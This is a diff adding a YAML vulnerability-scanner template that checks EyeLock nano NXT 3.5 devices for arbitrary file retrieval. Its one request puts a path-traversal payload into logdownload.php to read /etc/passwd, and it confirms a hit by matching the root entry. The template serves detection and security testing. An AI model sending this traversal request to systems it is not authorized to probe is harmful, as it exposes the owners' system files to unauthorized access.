@@ -1,0 +1,27 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    regex:
+    - 'root:[x*]:0:0:'
+    type: regex
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd'
+id: eyelock-nano-lfd
+info:
+  author: geeknik
+  description: EyeLock nano NXT suffers from a file retrieval vulnerability when input
+    passed through the 'path' parameter to 'logdownload.php' script is not properly
+    verified before being used to read files. This can be exploited to disclose contents
+    of files from local resources.
+  metadata:
+    max-request: 1
+  name: EyeLock nano NXT 3.5 - Arbitrary File Retrieval
+  reference:
+  - https://www.zeroscience.mk/codes/eyelock_lfd.txt
+  severity: high
+  tags: iot,lfi,eyelock,vuln
